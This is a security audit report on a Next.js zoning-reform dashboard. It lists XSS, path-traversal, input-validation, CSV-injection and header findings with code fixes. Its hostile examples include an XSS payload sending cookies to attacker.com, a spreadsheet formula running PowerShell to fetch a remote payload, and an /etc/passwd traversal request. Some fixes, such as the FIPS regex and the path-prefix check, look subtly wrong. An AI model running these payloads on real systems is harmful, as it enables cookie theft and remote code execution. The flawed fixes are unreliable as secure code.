# COMPREHENSIVE SECURITY AUDIT REPORT
## Zoning Reform Analysis Web Application

**Audit Date:** November 19, 2025
**Framework:** Next.js 16.0.3 with React 19.2.0 and TypeScript
**Location:** `/home/user/zoning-reform-analysis-2025/app`

---

## EXECUTIVE SUMMARY

The application is a Next.js-based dashboard for analyzing zoning reform impacts using Census Bureau data. While the application demonstrates good TypeScript practices and proper dependency management, **critical security vulnerabilities have been identified** that require immediate remediation.

**Severity Breakdown:**
- **CRITICAL:** 1
- **HIGH:** 4
- **MEDIUM:** 4
- **LOW:** 1

---

## DETAILED FINDINGS

### 1. CRITICAL: Cross-Site Scripting (XSS) via Unsanitized HTML Injection

**Severity:** CRITICAL  
**Location:** `/home/user/zoning-reform-analysis-2025/app/components/visualizations/ChoroplethMap.tsx`  
**Lines:** 164-178 (reform states), 185-198 (baseline states)

**Description:**
The ChoroplethMap component uses D3.js `.html()` method with unsanitized template literals that directly interpolate user-controlled data from API responses. The `.html()` method in D3 does NOT sanitize HTML, allowing attackers to inject arbitrary JavaScript.

**Vulnerable Code:**
```typescript
// Lines 164-178 (Reform state tooltip)
tooltip.html(`
  <div class="bg-[var(--bg-card)] border-2 border-[#fbbf24] rounded-lg p-3 shadow-lg">
    <div class="flex items-center gap-2 mb-1">
      <span class="text-lg">⭐</span>
      <span class="font-semibold text-[var(--text-primary)]">${stateData.jurisdiction}</span>
    </div>
    <div class="text-sm text-[var(--text-muted)] mb-2">${stateData.reform_name}</div>
    <div class="text-base font-semibold ${(stateData.pct_change ?? 0) >= 0 ? 'text-[var(--positive-green)]' : 'text-[var(--negative-red)]'}">
      Reform Impact: ${(stateData.pct_change ?? 0) >= 0 ? '+' : ''}${(stateData.pct_change ?? 0).toFixed(1)}%
    </div>
    ...
  </div>
`);
```

**Attack Vector:**
If an attacker can control the `jurisdiction` or `reform_name` fields in the API response (via compromised data source or MITM), they can inject:
```
Malicious Jurisdiction: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

When this is rendered, the JavaScript will execute in the user's browser, potentially stealing session cookies, credentials, or redirecting to phishing sites.

**Impact:**
- Session hijacking via cookie theft
- Credential harvesting
- Malware distribution
- Website defacement
- User data theft

**Recommended Fix:**
Replace `.html()` with `.text()` for text content, or use a DOM API instead:

```typescript
// Option 1: Use text() for text-only content
tooltip.text(`${stateData.jurisdiction}`);

// Option 2: Build DOM elements safely
const div = document.createElement('div');
div.className = 'bg-[var(--bg-card)] border-2 border-[#fbbf24] rounded-lg p-3 shadow-lg';
const span = document.createElement('span');
span.textContent = stateData.jurisdiction; // textContent is safe from XSS
div.appendChild(span);
tooltipRef.current.appendChild(div);

// Option 3: Use a sanitization library (DOMPurify)
import DOMPurify from 'dompurify';
tooltip.html(DOMPurify.sanitize(htmlString));
```

---

### 2. HIGH: Path Traversal Vulnerability in API Routes

**Severity:** HIGH  
**Locations:**
- `/home/user/zoning-reform-analysis-2025/app/app/api/states/baseline/route.ts` (lines 11-16)
- `/home/user/zoning-reform-analysis-2025/app/app/api/reforms/metrics/route.ts` (lines 12-17)
- `/home/user/zoning-reform-analysis-2025/app/app/api/counties/[state_fips]/route.ts` (lines 13-18)
- `/home/user/zoning-reform-analysis-2025/app/app/api/predictions/route.ts` (lines 8-13)

**Description:**
Multiple API routes use relative path traversal (`..`) to access files outside the application directory. While the current paths are hardcoded and safe, this pattern is a security anti-pattern that could be exploited if parameterized in the future.

**Vulnerable Code (baseline route example):**
```typescript
// /app/api/states/baseline/route.ts, lines 11-16
const metricsPath = path.join(
  process.cwd(),
  "..",           // UNSAFE: Traverses up one directory
  "data",
  "outputs",
  "all_states_baseline_metrics.csv"
);
```

**Directory Structure:**
```
/home/user/zoning-reform-analysis-2025/
├── app/                                <- process.cwd() points here
│   └── app/api/states/baseline/route.ts
├── data/                               <- ".." gets us here (UNSAFE)
│   └── outputs/
│       └── all_states_baseline_metrics.csv
```

**Attack Scenario:**
If this pattern is copied and refactored to accept user input, it could allow:
```
GET /api/read-file?path=../../../../etc/passwd
```

**Recommended Fix:**
```typescript
// Use environment variables with validation
const DATA_DIR = path.resolve(process.env.DATA_DIRECTORY || '../data');
const metricsPath = path.join(DATA_DIR, 'outputs', 'all_states_baseline_metrics.csv');

// Validate the resolved path is within allowed directory
if (!metricsPath.startsWith(DATA_DIR)) {
  throw new Error('Path traversal attempt detected');
}
```

Or use the `public` directory in Next.js for static files:
```typescript
// Move CSV files to /public and serve statically instead
GET /api/states/baseline -> redirect to /data/states-baseline.csv
```

---

### 3. HIGH: Missing Input Validation on Dynamic Route Parameters

**Severity:** HIGH  
**Location:** `/home/user/zoning-reform-analysis-2025/app/app/api/counties/[state_fips]/route.ts`  
**Line:** 11

**Description:**
The `state_fips` parameter is extracted from the URL but never validated before use. While it's only used for filtering data, lack of validation is a security risk.

**Vulnerable Code:**
```typescript
export async function GET(
  request: Request,
  { params }: { params: { state_fips: string } }
) {
  try {
    const { state_fips } = params; // NO VALIDATION

    const csvPath = path.join(
      process.cwd(),
      "..",
      "data",
      "outputs",
      "county_permits_monthly.csv"
    );

    const fileContent = await fs.readFile(csvPath, "utf-8");
    const records = parse(fileContent, {
      columns: true,
      skip_empty_lines: true,
    });

    // Filter by state FIPS - unvalidated parameter
    const stateRecords = records.filter((r: any) => r.state_fips === state_fips);
```

**Current Impact:**
- Low: Currently only used for filtering, so passing invalid values returns empty results
- But this violates the principle of input validation

**Recommended Fix:**
```typescript
// Validate state FIPS code format (2-digit number)
const STATE_FIPS_PATTERN = /^0[1-9]|[1-5]\d|6[0-9]|7[0-2]$/;

export async function GET(
  request: Request,
  { params }: { params: { state_fips: string } }
) {
  const { state_fips } = params;
  
  // Validate input
  if (!STATE_FIPS_PATTERN.test(state_fips)) {
    return NextResponse.json(
      { error: 'Invalid state FIPS code' },
      { status: 400 }
    );
  }
  
  // ... rest of code
}
```

---

### 4. HIGH: Incomplete/Naive CSV Parsing Without Proper Field Handling

**Severity:** HIGH  
**Locations:**
- `/home/user/zoning-reform-analysis-2025/app/app/api/states/baseline/route.ts` (lines 22-32)
- `/home/user/zoning-reform-analysis-2025/app/app/api/reforms/metrics/route.ts` (lines 23-33)

**Description:**
CSV parsing uses simple `.split(",")` without handling:
1. Quoted fields containing commas
2. Escaped quotes
3. Malformed CSV data
4. Empty/missing fields

**Vulnerable Code:**
```typescript
// Lines 22-32 (baseline route)
const lines = csvContent.trim().split("\n");
const headers = lines[0].split(",");

const data = lines.slice(1).map((line) => {
  const values = line.split(",");
  const obj: any = {};
  headers.forEach((header, index) => {
    obj[header.trim()] = values[index]?.trim() || null;
  });
  return obj;
});
```

**Example of Parsing Failure:**
Given this CSV:
```csv
jurisdiction,reform_name,reform_type
California,"Bay Area Housing, Growth",Zoning
```

The parser would incorrectly split "Bay Area Housing, Growth" into two fields instead of one quoted field.

**Current Impact:**
- Data corruption
- Potential fields array out of bounds (though JavaScript handles this gracefully)
- Incorrect data served to frontend

**Recommended Fix:**
The codebase already uses `csv-parse` library in other routes. Use it consistently:

```typescript
// GOOD: Currently used in counties and predictions routes
import { parse } from "csv-parse/sync";

const records = parse(fileContent, {
  columns: true,
  skip_empty_lines: true,
  trim: true,
  quote: '"',
  escape: '"'
});
```

**Apply to baseline and metrics routes:**
```typescript
// /api/states/baseline/route.ts
import { parse } from "csv-parse/sync";

export async function GET() {
  try {
    const metricsPath = path.join(process.cwd(), "..", "data", "outputs", "all_states_baseline_metrics.csv");
    const csvContent = await readFile(metricsPath, "utf-8");

    // Use csv-parse instead of manual split
    const data = parse(csvContent, {
      columns: true,
      skip_empty_lines: true,
      trim: true
    });

    return NextResponse.json({
      success: true,
      data,
      count: data.length,
      source: "census_baseline_all_states",
    });
  } catch (error) {
    // ... error handling
  }
}
```

---

### 5. MEDIUM: Missing Input Validation on Query Parameters

**Severity:** MEDIUM  
**Locations:**
- `/home/user/zoning-reform-analysis-2025/app/app/api/census/permits/route.ts` (lines 24-29)
- `/home/user/zoning-reform-analysis-2025/app/app/api/census/live-permits/route.ts` (lines 27-28)

**Description:**
Year parameters (`startYear`, `endYear`) are parsed without validation. No bounds checking or type validation.

**Vulnerable Code:**
```typescript
// /api/census/permits/route.ts, lines 24-29
const searchParams = request.nextUrl.searchParams;
const startYear = searchParams.get("startYear");
const endYear = searchParams.get("endYear");

const options = {
  startYear: startYear ? parseInt(startYear, 10) : undefined,
  endYear: endYear ? parseInt(endYear, 10) : undefined,
};
```

**Attack Scenarios:**
```
GET /api/census/permits?startYear=2147483647&endYear=2147483647
    -> Integer overflow
GET /api/census/permits?startYear=NaN&endYear=NaN
    -> parseInt returns NaN
GET /api/census/permits?startYear=1776&endYear=2500
    -> Out of historical bounds
GET /api/census/permits?startYear=2025&endYear=1990
    -> Invalid range (start > end)
```

**Recommended Fix:**
```typescript
const MIN_YEAR = 1990;
const MAX_YEAR = new Date().getFullYear();

function validateYearParam(param: string | null, defaultValue: number): number {
  if (!param) return defaultValue;
  
  const year = parseInt(param, 10);
  
  // Validate it's a valid number
  if (isNaN(year)) {
    throw new Error('Year must be a valid number');
  }
  
  // Validate range
  if (year < MIN_YEAR || year > MAX_YEAR) {
    throw new Error(`Year must be between ${MIN_YEAR} and ${MAX_YEAR}`);
  }
  
  return year;
}

export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams;
    const startYear = validateYearParam(searchParams.get("startYear"), 2015);
    const endYear = validateYearParam(searchParams.get("endYear"), 2024);

    // Validate range
    if (startYear > endYear) {
      return NextResponse.json(
        { error: 'startYear must be less than or equal to endYear' },
        { status: 400 }
      );
    }

    const options = { startYear, endYear };
    // ... rest of code
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : 'Invalid parameters' },
      { status: 400 }
    );
  }
}
```

---

### 6. MEDIUM: Unvalidated Parameter in External API Call

**Severity:** MEDIUM  
**Location:** `/home/user/zoning-reform-analysis-2025/app/lib/census-api.ts`  
**Lines:** 70-88 (function `fetchStatePermitsByState`)

**Description:**
The `stateCode` parameter is directly interpolated into the Census API URL without validation.

**Vulnerable Code:**
```typescript
export async function fetchStatePermitsByState(
  apiKey: string,
  stateCode: string,  // NOT VALIDATED
  options?: {
    startYear?: number;
    endYear?: number;
  }
): Promise<CensusPermitData[]> {
  const params = new URLSearchParams({
    get: "time,areaname,state,value,unit,areatype",
    "for": `state:${stateCode}`,  // DIRECTLY INTERPOLATED
    key: apiKey,
  });
  // ...
}
```

**Attack Scenarios:**
```
stateCode = "06&key=malicious_key"
  -> URL: ...&for=state:06&key=malicious_key
  -> Could potentially be used for parameter injection

stateCode = "06;DROP TABLE permits--"
  -> While not directly SQL (it's a REST API), this shows injection pattern
```

**Current Impact:**
- Low: Census API likely validates state codes, so invalid values return empty results
- But demonstrates poor input validation practice

**Recommended Fix:**
```typescript
// Valid US state FIPS codes (01-56, excluding 03, 14, etc.)
const VALID_STATE_FIPS = new Set([
  "01", "02", "04", "05", "06", "08", "09", "10", "11", "12",
  "13", "15", "16", "17", "18", "19", "20", "21", "22", "23",
  "24", "25", "26", "27", "28", "29", "30", "31", "32", "33",
  "34", "35", "36", "37", "38", "39", "40", "41", "42", "44",
  "45", "46", "47", "48", "49", "50", "51", "53", "54", "55", "56"
]);

export async function fetchStatePermitsByState(
  apiKey: string,
  stateCode: string,
  options?: {
    startYear?: number;
    endYear?: number;
  }
): Promise<CensusPermitData[]> {
  // Validate state code
  if (!VALID_STATE_FIPS.has(stateCode)) {
    throw new Error(`Invalid state FIPS code: ${stateCode}`);
  }
  // ... rest of function
}
```

---

### 7. MEDIUM: Missing Security Headers Configuration

**Severity:** MEDIUM  
**Location:** `/home/user/zoning-reform-analysis-2025/app/next.config.ts`

**Description:**
No security headers are configured. The application should implement HTTP security headers to protect against various attacks.

**Current Configuration:**
```typescript
const nextConfig: NextConfig = {
  // Empty configuration - no security headers
};
```

**Missing Headers:**
1. **Content-Security-Policy (CSP)** - Prevents XSS by restricting resource loading
2. **X-Frame-Options** - Prevents clickjacking
3. **X-Content-Type-Options** - Prevents MIME type sniffing
4. **Strict-Transport-Security (HSTS)** - Forces HTTPS
5. **Referrer-Policy** - Controls referrer information leakage
6. **Permissions-Policy** - Controls browser features

**Recommended Fix:**
```typescript
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          {
            key: "X-Content-Type-Options",
            value: "nosniff"
          },
          {
            key: "X-Frame-Options",
            value: "DENY"
          },
          {
            key: "X-XSS-Protection",
            value: "1; mode=block"
          },
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin"
          },
          {
            key: "Permissions-Policy",
            value: "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()"
          },
          {
            key: "Content-Security-Policy",
            value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://api.census.gov"
          }
        ]
      }
    ];
  }
};

export default nextConfig;
```

**Note:** The CSP above allows `unsafe-inline` for styles (required for Tailwind) and `unsafe-eval` (required for some D3 features). Consider using proper CSP nonces for production.

---

### 8. MEDIUM: Verbose Error Messages Revealing Internal Structure

**Severity:** MEDIUM  
**Locations:** Multiple API routes

**Description:**
API endpoints return error messages that could reveal internal application structure and file paths.

**Examples:**
```typescript
// /api/census/permits/route.ts
return NextResponse.json(
  {
    error: "Failed to fetch Census data",
    message: error instanceof Error ? error.message : "Unknown error"
  },
  { status: 500 }
);
```

**Potential Leakage:**
```json
{
  "error": "Failed to fetch Census data",
  "message": "ENOENT: no such file or directory, open '/home/user/zoning-reform-analysis-2025/data/outputs/all_states_baseline_metrics.csv'"
}
```

This reveals:
- Full file system paths
- Operating system paths format (Linux)
- Internal directory structure

**Recommended Fix:**
```typescript
// In production, return generic messages
const isDevelopment = process.env.NODE_ENV === 'development';

export async function GET(request: NextRequest) {
  try {
    // ... API logic
  } catch (error) {
    const errorMessage = isDevelopment && error instanceof Error 
      ? error.message 
      : 'Internal server error';
    
    console.error('Error fetching Census data:', error); // Log full error
    
    return NextResponse.json(
      {
        error: "Failed to fetch data",
        ...(isDevelopment && { message: errorMessage })
      },
      { status: 500 }
    );
  }
}
```

---

### 9. LOW: Potential for Unsafe Window Navigation

**Severity:** LOW  
**Location:** `/home/user/zoning-reform-analysis-2025/app/app/live/page.tsx`  
**Line:** 103

**Description:**
Direct assignment to `window.location.href` is used for navigation.

**Current Code:**
```typescript
<DataSourcePanel
  source="live_census"
  onSwitch={() => (window.location.href = "/")}
  onRefresh={refresh}
  metadata={metadata}
/>
```

**Risk Level:**
- LOW: The URL is hardcoded, so current implementation is safe
- MEDIUM: If this pattern is reused with user input, it becomes a vulnerability

**Recommended Fix:**
```typescript
import { useRouter } from 'next/navigation';

export default function LiveDashboardPage() {
  const router = useRouter();
  
  const handleSwitch = () => {
    router.push('/');
  };

  return (
    <DataSourcePanel
      source="live_census"
      onSwitch={handleSwitch}
      onRefresh={refresh}
      metadata={metadata}
    />
  );
}
```

---

### 10. MEDIUM: Potential CSV Injection in Data Export

**Severity:** MEDIUM  
**Location:** `/home/user/zoning-reform-analysis-2025/app/components/dashboard/DataExport.tsx`  
**Lines:** 14-23

**Description:**
The CSV export function attempts to escape values with quotes, but doesn't properly handle CSV injection attacks.

**Vulnerable Code:**
```typescript
const rows = data.map(row =>
  Object.values(row).map(val => {
    const str = String(val ?? "");
    return str.includes(",") ? `"${str}"` : str;  // INCOMPLETE ESCAPING
  }).join(",")
);
```

**CSV Injection Vulnerability:**
If a field contains a formula like `=cmd|'/c powershell IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload\")'!A0`, Excel or LibreOffice will execute it.

**Attack Example:**
```
jurisdiction value: =1+1 (displays as 2 in Excel)
jurisdiction value: @SUM(1+9)*cmd|'/c calc'!A0
```

**Recommended Fix:**
```typescript
const handleExportCSV = () => {
  if (data.length === 0) return;

  const headers = Object.keys(data[0]).join(",");

  // Properly escape CSV values
  const rows = data.map(row =>
    Object.values(row).map(val => {
      const str = String(val ?? "");
      
      // Prevent formula injection
      if (/^[=+\-@]/.test(str)) {
        return `"='${str}'"`;  // Prefix with quote to prevent formula execution
      }
      
      // Escape quotes and wrap in quotes if needed
      if (str.includes(",") || str.includes('"') || str.includes("\n")) {
        return `"${str.replace(/"/g, '""')}"`;
      }
      
      return str;
    }).join(",")
  );

  const csv = [headers, ...rows].join("\n");
  // ... rest of code
};
```

---

## DEPENDENCIES SECURITY CHECK

**Status:** PASSED ✓

Ran `npm audit` on both root and `/app` directories:
```
$ npm audit --audit-level=moderate /home/user/zoning-reform-analysis-2025/app
found 0 vulnerabilities
```

**Key Dependencies:**
- next@^16.0.3 - Current stable version
- react@^19.2.0 - Latest version
- typescript@^5.9.3 - Latest version
- d3@^7.9.0 - Current stable version
- csv-parse@^5.x (implicit via parsing library)

**Recommendation:** Continue running `npm audit` regularly as part of CI/CD pipeline.

---

## MISSING SECURITY FEATURES

### 1. Authentication & Authorization
- No authentication mechanisms found
- Application appears to be public-facing
- **If authentication is required in the future, ensure:**
  - CSRF tokens for state-changing operations
  - Session management with secure cookies (HttpOnly, Secure, SameSite)
  - Role-based access control (RBAC)

### 2. Rate Limiting
- No rate limiting on API endpoints
- Census API calls could be abused
- **Recommended:** Implement rate limiting middleware using Next.js or libraries like `ratelimit`

### 3. CORS Configuration
- No CORS restrictions found
- Endpoints accept requests from any origin
- **Recommended:** Implement CORS middleware if cross-origin requests need restriction

### 4. HTTPS/TLS
- Not enforced in configuration
- **Recommendation:** Set HSTS header and enforce HTTPS in production

### 5. Content Security Policy (CSP)
- Not configured
- Critical for XSS protection
- See recommendation #7 above

---

## SUMMARY TABLE

| Issue | Severity | Type | Location | Status |
|-------|----------|------|----------|--------|
| XSS via .html() injection | CRITICAL | Code Injection | ChoroplethMap.tsx:164-198 | Requires immediate fix |
| Path traversal with .. | HIGH | Path Traversal | 4 API routes | Refactor pattern |
| Missing state_fips validation | HIGH | Input Validation | counties route | Add validation |
| Naive CSV parsing | HIGH | Data Parsing | 2 API routes | Use csv-parse library |
| Year parameter validation missing | MEDIUM | Input Validation | 2 API routes | Add bounds checking |
| StateCode validation missing | MEDIUM | Input Validation | census-api.ts | Add validation |
| No security headers | MEDIUM | Configuration | next.config.ts | Add headers config |
| Verbose error messages | MEDIUM | Information Disclosure | Multiple routes | Sanitize error responses |
| CSV injection in export | MEDIUM | Code Injection | DataExport.tsx | Escape formula chars |
| Unsafe window.location | LOW | Navigation | live/page.tsx | Use Next.js router |

---

## REMEDIATION PRIORITY

**Immediate (24-48 hours):**
1. Fix CRITICAL XSS vulnerability in ChoroplethMap
2. Add input validation to year parameters
3. Implement proper CSV parsing for baseline and metrics routes

**Short-term (1-2 weeks):**
4. Add security headers configuration
5. Refactor path traversal patterns
6. Add state_fips validation
7. Sanitize error messages

**Medium-term (2-4 weeks):**
8. Add CSV injection prevention
9. Replace window.location with Next.js router
10. Implement rate limiting
11. Add request logging and monitoring

---

## TESTING RECOMMENDATIONS

### Manual Testing:
1. Test XSS payload: `<img src=x onerror="alert('XSS')">`
2. Test CSV injection: `=1+1` in jurisdiction field
3. Test invalid year parameters: `?startYear=abc&endYear=2500`
4. Test invalid state FIPS: `?state_fips=999`

### Automated Testing:
- Use OWASP ZAP or Burp Suite for vulnerability scanning
- Implement ESLint security plugin (`eslint-plugin-security`)
- Add unit tests for input validation
- Integrate security scanning in CI/CD pipeline

### Security Headers Validation:
- Use https://securityheaders.com to verify headers
- Use https://csp-evaluator.withgoogle.com for CSP verification

---

## CONCLUSION

The application demonstrates solid software engineering practices with TypeScript, proper dependency management, and responsive UI design. However, **critical security vulnerabilities, particularly the XSS issue in the choropleth map component, must be addressed before production deployment**.

The recommended fixes are straightforward to implement and should be prioritized in order of severity. After implementing these fixes, the application will meet OWASP Top 10 baseline security requirements.

---

**Report Generated:** November 19, 2025  
**Auditor:** Security Assessment Tool  
**Status:** REQUIRES REMEDIATION
